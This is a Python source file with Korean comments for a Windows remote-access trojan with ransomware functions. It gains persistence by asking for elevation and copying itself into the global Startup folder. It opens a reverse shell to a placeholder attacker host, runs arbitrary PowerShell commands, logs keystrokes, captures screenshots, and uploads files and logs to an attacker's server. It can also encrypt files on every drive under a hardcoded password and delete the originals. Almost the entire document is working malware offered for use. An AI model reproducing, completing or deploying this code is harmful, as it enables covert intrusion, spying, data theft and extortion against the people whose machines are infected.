import os
import sys
import shutil
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if is_admin():
        return
    params = ' '.join([f'"{arg}"' for arg in sys.argv])
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1)
    sys.exit(0)

def get_global_startup_path():
    startup_dir = os.path.expandvars(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
    exe_name = os.path.basename(sys.argv[0])
    return os.path.join(startup_dir, exe_name)

def in_global_startup():
    return os.path.abspath(sys.argv[0]).lower() == get_global_startup_path().lower()

def copy_self_to_global_startup():
    exe_path = os.path.abspath(sys.argv[0])
    dst_path = get_global_startup_path()
    if not os.path.exists(dst_path):
        shutil.copy2(exe_path, dst_path)
    return dst_path


import os
import socket
import subprocess
import string
import threading
import time
from datetime import datetime
import uuid
import platform
import requests

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

from pynput import keyboard
import psutil
import win32gui
import win32process
from PIL import ImageGrab

# 서버 주소와 포트(Flask 업로드 서버로 변경!)
UPLOAD_SERVER = 'http://your ip address/upload'  # <-- 여기에 본인 서버 주소 입력
host = 'your ip address'
port = 9999

CMD_HISTORY_PATH = os.path.expandvars(r"%TEMP%\cmd_history.log")
def load_last_cmdid():
    try:
        if os.path.exists(CMD_HISTORY_PATH):
            with open(CMD_HISTORY_PATH, 'r') as f:
                lines = f.read().splitlines()
                if lines:
                    return lines[-1].split('|',1)[0], lines[-1].split('|',1)[1]
    except:
        pass
    return None, None

def save_cmdid_result(cmdid, result):
    try:
        with open(CMD_HISTORY_PATH, 'a') as f:
            f.write(f"{cmdid}|{result}\n")
    except:
        pass

key_log = []
keylog_lock = threading.Lock()
keylog_running = threading.Event()
keylog_thread = None

def get_active_process():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return "unknown"
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        return psutil.Process(pid).name()
    except Exception:
        return "unknown"

def on_press(key):
    process_name = get_active_process()
    try:
        key_char = key.char
        if key_char is not None:
            klog = key_char
        else:
            klog = str(key)
    except AttributeError:
        klog = str(key)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"{klog} ({process_name}) {now}"
    with keylog_lock:
        key_log.append(line)
    if not keylog_running.is_set():
        return False

def keylogger():
    global key_log
    key_log = []
    keylog_running.set()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylogger():
    global keylog_thread
    if keylog_running.is_set():
        return False
    keylog_thread = threading.Thread(target=keylogger, daemon=True)
    keylog_thread.start()
    return True

def stop_keylogger():
    keylog_running.clear()
    if keylog_thread is not None:
        keylog_thread.join(timeout=5)

def get_keylog_lines():
    with keylog_lock:
        return list(key_log)

def send_file_to_server(filepath, tag="file"):
    # 서버로 파일 업로드
    try:
        with open(filepath, "rb") as f:
            files = {'file': (os.path.basename(filepath), f)}
            data = {'tag': tag}
            res = requests.post(UPLOAD_SERVER, files=files, data=data, timeout=30)
        return f"[+] 업로드 성공: {filepath}, 응답: {res.text}"
    except Exception as e:
        return f"[!] 업로드 실패: {filepath}, 에러: {e}"

def send_text_to_server(text, filename="keylog.txt", tag="keylog"):
    try:
        temp_path = os.path.join(os.environ.get("TEMP", "."), filename)
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(text)
        return send_file_to_server(temp_path, tag=tag)
    except Exception as e:
        return f"[!] 로그 업로드 실패: {e}"

def capture_screenshot():
    try:
        img = ImageGrab.grab()
        temp_path = os.path.expandvars(r"%TEMP%\screenshot.png")
        img.save(temp_path)
        return temp_path
    except Exception as e:
        return None

def get_sysinfo():
    try:
        info = []
        info.append(f"Hostname: {socket.gethostname()}")
        try:
            info.append(f"Username: {os.getlogin()}")
        except:
            info.append(f"Username: unknown")
        info.append(f"OS: {platform.platform()}")
        info.append(f"OS Version: {platform.version()}")
        info.append(f"Architecture: {platform.machine()}")
        info.append(f"Processor: {platform.processor()}")
        info.append(f"CPU Count: {os.cpu_count()}")
        try:
            mem = psutil.virtual_memory()
            info.append(f"RAM: {mem.total // (1024*1024)} MB")
            disk = psutil.disk_usage('/')
            info.append(f"Disk: {disk.total // (1024*1024*1024)} GB")
            nics = psutil.net_if_addrs()
            for nic, addrs in nics.items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        info.append(f"Interface {nic}: {addr.address}")
        except Exception as e:
            info.append(f"(psutil info error: {e})")
        return '\n'.join(info)
    except Exception as e:
        return f"[!] sysinfo error: {e}"

EXCLUDE_DIRS = [
    r"C:\Windows",
    r"C:\Program Files",
    r"C:\Program Files (x86)",
    r"C:\$Recycle.Bin",
    r"C:\System Volume Information"
]
TARGET_EXTS = set([
    '.txt', '.rtf', '.md', '.pdf', '.tex',
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp', '.csv',
    '.hwp', '.hwpx', '.cell', '.show', '.wpd', '.pages', '.numbers', '.key',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.webp', '.ico',
    '.psd', '.psb', '.ai', '.eps', '.svg', '.raw', '.indd', '.cdr', '.xcf', '.sketch', '.heic',
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma', '.ape', '.alac', '.aiff', '.mid', '.amr',
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.3gp', '.mpg', '.mpeg', '.ts', '.m4v', '.vob',
    '.exe', '.dll', '.com', '.bat', '.cmd', '.msi', '.vbs', '.js', '.jse', '.wsf', '.jar', '.py', '.pyw', '.ipynb', '.rb',
    '.php', '.pl', '.sh', '.bash', '.ps1', '.gadget', '.scr',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.cab', '.iso', '.img', '.dmg', '.tgz', '.lz', '.lzma',
    '.db', '.sqlite', '.sqlite3', '.accdb', '.mdb', '.sql', '.dbf', '.frm', '.myd', '.myi', '.ndf', '.ldf', '.sdf',
    '.csv', '.tsv', '.xml', '.json', '.yaml', '.yml', '.dat', '.log', '.sav',
    '.dwg', '.dxf', '.ipt', '.idw', '.iam', '.step', '.stp', '.prt', '.sldprt', '.sldasm', '.catpart', '.catdrawing', '.catproduct',
    '.c', '.cpp', '.h', '.hpp', '.cs', '.vb', '.java', '.class', '.swift', '.go', '.kt', '.js', '.ts', '.dart', '.m', '.mm', '.rs', '.lua', '.html', '.htm', '.css', '.scss', '.less', '.json', '.xml', '.yaml', '.yml', '.cfg', '.ini', '.pl', '.rb', '.php', '.asp', '.aspx', '.jsp', '.sh', '.py', '.pyw', '.ipynb',
    '.bak', '.tmp', '.swp', '.lock', '.backup', '.old', '.ori', '.bkp', '.temp', '.chk', '.log', '.cache',
    '.pst', '.ost', '.eml', '.msg', '.mbox', '.vcf', '.ics',
    '.vmdk', '.vhd', '.vhdx', '.qcow2', '.img', '.dmg', '.efi',
    '.sav', '.dat', '.wallet', '.key', '.pem', '.p12', '.pfx', '.ttf', '.otf', '.fon', '.project', '.sln', '.xcodeproj', '.cproj', '.pro', '.vcxproj', '.csproj'
])
DEFAULT_PASSWORD = 'SecretPassword!@#'

def should_exclude_dir(path):
    path = os.path.abspath(path).lower()
    for ex in EXCLUDE_DIRS:
        if path.startswith(ex.lower()):
            return True
    return False

def should_encrypt(file_path):
    _, ext = os.path.splitext(file_path)
    ext = ext.lower()
    if ext == ".enc":
        return False
    return ext in TARGET_EXTS or ext not in {''}

def get_all_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def encrypt_file(path):
    if path.lower().endswith('.enc'):
        return f"[+] 이미 암호화됨: {path}"
    try:
        password = DEFAULT_PASSWORD
        salt = get_random_bytes(16)
        key = PBKDF2(password, salt, dkLen=32)
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(path, 'rb') as f:
            data = f.read()
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        ciphertext = cipher.encrypt(data)
        out_path = path + '.enc'
        with open(out_path, 'wb') as f:
            f.write(salt + iv + ciphertext)
        os.remove(path)
        return f"[+] 암호화 완료: {out_path}"
    except Exception as e:
        return f"[!] {path} 암호화 실패: {e}"

def decrypt_file(path):
    if not path.lower().endswith('.enc'):
        return f"[!] 복호화 대상이 아님: {path}"
    try:
        password = DEFAULT_PASSWORD
        with open(path, 'rb') as f:
            salt = f.read(16)
            iv = f.read(16)
            ciphertext = f.read()
        key = PBKDF2(password, salt, dkLen=32)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        data = cipher.decrypt(ciphertext)
        pad_len = data[-1]
        data = data[:-pad_len]
        out_path = path[:-4]  # .enc 제거
        with open(out_path, 'wb') as f:
            f.write(data)
        os.remove(path)
        return f"[+] 복호화 완료: {out_path}"
    except Exception as e:
        return f"[!] {path} 복호화 실패: {e}"

def list_all_target_files():
    files = []
    for drive in get_all_drives():
        for root, dirs, filelist in os.walk(drive):
            if should_exclude_dir(root):
                dirs[:] = []
                continue
            for fname in filelist:
                fpath = os.path.join(root, fname)
                if should_encrypt(fpath):
                    files.append(fpath)
    return files

def list_all_enc_files():
    files = []
    for drive in get_all_drives():
        for root, dirs, filelist in os.walk(drive):
            if should_exclude_dir(root):
                dirs[:] = []
                continue
            for fname in filelist:
                fpath = os.path.join(root, fname)
                if fpath.lower().endswith('.enc'):
                    files.append(fpath)
    return files

def encrypt_all_files():
    files = list_all_target_files()
    result = []
    for fpath in files:
        try:
            res = encrypt_file(fpath)
        except Exception as e:
            res = f"[!] {fpath} 암호화 실패: {e}"
        result.append(res)
    return '\n'.join(result)

def decrypt_all_files():
    files = list_all_enc_files()
    result = []
    for fpath in files:
        try:
            res = decrypt_file(fpath)
        except Exception as e:
            res = f"[!] {fpath} 복호화 실패: {e}"
        result.append(res)
    return '\n'.join(result)

def encrypt_path(target_path):
    result = []
    files = []
    if os.path.isfile(target_path):
        files = [target_path]
    elif os.path.isdir(target_path):
        for root, dirs, filelist in os.walk(target_path):
            if should_exclude_dir(root):
                dirs[:] = []
                continue
            for fname in filelist:
                fpath = os.path.join(root, fname)
                if should_encrypt(fpath):
                    files.append(fpath)
    else:
        return f"[!] 경로 없음: {target_path}"

    for fpath in files:
        try:
            res = encrypt_file(fpath)
        except Exception as e:
            res = f"[!] {fpath} 암호화 실패: {e}"
        result.append(res)
    return '\n'.join(result)

def decrypt_path(target_path):
    result = []
    files = []
    if os.path.isfile(target_path) and target_path.lower().endswith('.enc'):
        files = [target_path]
    elif os.path.isdir(target_path):
        for root, dirs, filelist in os.walk(target_path):
            if should_exclude_dir(root):
                dirs[:] = []
                continue
            for fname in filelist:
                fpath = os.path.join(root, fname)
                if fpath.lower().endswith('.enc'):
                    files.append(fpath)
    else:
        return f"[!] 경로 없음: {target_path}"

    for fpath in files:
        try:
            res = decrypt_file(fpath)
        except Exception as e:
            res = f"[!] {fpath} 복호화 실패: {e}"
        result.append(res)
    return '\n'.join(result)

def resolve_new_dir(base, target):
    if target in ['.', '']:
        return base
    if target == '..':
        parent = os.path.dirname(base.rstrip("\\/"))
        if len(parent) < 3:
            parent = base[:3]
        return parent
    if os.path.isabs(target):
        return os.path.abspath(target)
    else:
        return os.path.abspath(os.path.join(base, target))

def reverse_shell():
    current_dir = os.getcwd()
    last_cmdid, last_result = load_last_cmdid()
    while True:
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.connect((host, port))
            s.settimeout(20)
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    msg = data.decode('utf-8', errors='ignore').strip()
                    if msg == "__ping__":
                        s.send("__pong__".encode())
                        continue
                    if '|' in msg:
                        cmdid, command = msg.split('|',1)
                    else:
                        cmdid, command = str(uuid.uuid4()), msg

                    if last_cmdid == cmdid:
                        resp = f"{cmdid}|{last_result}"
                        s.send(resp.encode('utf-8', errors='replace'))
                        continue

                    result = ""

                    if command == "keylogging":
                        if start_keylogger():
                            result = "[+] 키로깅 시작됨\n"
                        else:
                            result = "[!] 이미 실행 중\n"

                    elif command == "stop keylogging":
                        stop_keylogger()
                        try:
                            log_lines = get_keylog_lines()
                            log_text = "\n".join(log_lines)
                            upload_res = send_text_to_server(log_text, filename="keylog.txt", tag="keylog")
                            result = "[+] 로그파일 서버 업로드 완료!\n" + upload_res
                        except Exception as e:
                            result = f"[!] 서버 업로드 실패: {e}\n"

                    elif command == "sysinfo":
                        result = get_sysinfo() + '\n'

                    elif command == "screenshot":
                        try:
                            img_path = capture_screenshot()
                            if img_path and os.path.exists(img_path):
                                upload_res = send_file_to_server(img_path, tag="screenshot")
                                result = "[+] 스크린샷 서버 업로드 완료!\n" + upload_res
                                os.remove(img_path)
                            else:
                                result = "[!] 스크린샷 캡처 실패\n"
                        except Exception as e:
                            result = f"[!] 스크린샷 처리 실패: {e}\n"

                    elif command.startswith("download "):
                        path = command[9:].strip().strip('"')
                        if os.path.isfile(path):
                            try:
                                upload_res = send_file_to_server(path, tag="download")
                                result = f"[+] 파일 {path} 서버 업로드 완료!\n" + upload_res
                            except Exception as e:
                                result = f"[!] 파일 서버 업로드 실패: {e}\n"
                        else:
                            result = f"[!] 파일 없음: {path}\n"

                    elif command.startswith('cd'):
                        try:
                            arg = command[2:].strip().strip('"')
                            new_dir = resolve_new_dir(current_dir, arg)
                            if os.path.isdir(new_dir):
                                current_dir = new_dir
                                result = f"[+] 이동: {current_dir}\n"
                            else:
                                result = f"[!] 해당 폴더 없음: {new_dir}\n"
                        except Exception as e:
                            result = f"[!] 디렉토리 이동 오류: {e}\n"

                    elif command == 'pwd':
                        result = f"{current_dir}\n"

                    elif command == 'encrypt':
                        result = encrypt_all_files() + '\n'

                    elif command == 'decrypt':
                        result = decrypt_all_files() + '\n'

                    elif command.startswith('encrypt '):
                        path = command[8:].strip().strip('"')
                        result = encrypt_path(path) + '\n'

                    elif command.startswith('decrypt '):
                        path = command[8:].strip().strip('"')
                        result = decrypt_path(path) + '\n'

                    else:
                        try:
                            ps = subprocess.Popen(
                                ['powershell.exe', '-NoLogo', '-NoProfile', '-Command', command],
                                cwd=current_dir,
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True
                            )
                            out, err = ps.communicate(timeout=15)
                            result = out + err
                            if not result.strip():
                                result = '[No Output]\n'
                        except Exception as e:
                            result = f"[Error] {e}\n"

                    last_cmdid = cmdid
                    last_result = result
                    save_cmdid_result(cmdid, result)
                    resp = f"{cmdid}|{result}"
                    s.send(resp.encode('utf-8', errors='replace'))
                except socket.timeout:
                    break
        except Exception:
            time.sleep(5)

if __name__ == '__main__':
     if in_global_startup():
        # 이미 Startup 폴더에 있으면 일반 권한으로 본 기능 실행 (UAC X)
        reverse_shell()    # 또는 원하는 본 기능 함수
     else:
        # Startup 폴더에 없으면 관리자 권한 요청 후 자기복사
        if not is_admin():
            run_as_admin()
        copy_self_to_global_startup()
        # 복사본을 일반 권한으로 실행
        os.startfile(get_global_startup_path())
        sys.exit(0)
